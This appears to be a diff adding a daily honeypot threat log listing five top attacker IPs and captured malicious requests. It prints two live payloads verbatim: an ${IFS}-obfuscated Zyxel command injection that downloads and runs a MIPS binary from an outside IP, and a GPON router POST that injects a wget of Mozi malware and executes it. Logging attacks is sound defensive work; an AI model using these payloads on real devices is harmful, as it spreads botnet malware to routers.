@@ -1,0 +1,22 @@
+Top 5 IPs for 2024-02-15:
+
+117.63.106.209
+142.93.134.203
+124.83.63.54
+59.127.234.82
+182.253.33.65
+
+Malcious Commands seen:
+
+/bin/zhttpd/${IFS}cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}*mips*;${IFS}wget${IFS}http://103.180.149.156/huhu.mips;${IFS}chmod${IFS}777${IFS}huhu.mips;${IFS}./huhu.mips${IFS}zyxel.selfrep;
+
+
+POST /GponForm/diag_Form?images/ HTTP/1.1
+Host: 127.0.0.1:8080
+Connection: keep-alive
+Accept-Encoding: gzip, deflate
+Accept: */*
+User-Agent: Hello, World
+Content-Length: 118
+
+XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://192.168.1.1:8088/Mozi.m+-O+->/tmp/gpon8080;sh+/tmp/gpon8080&ipv=0
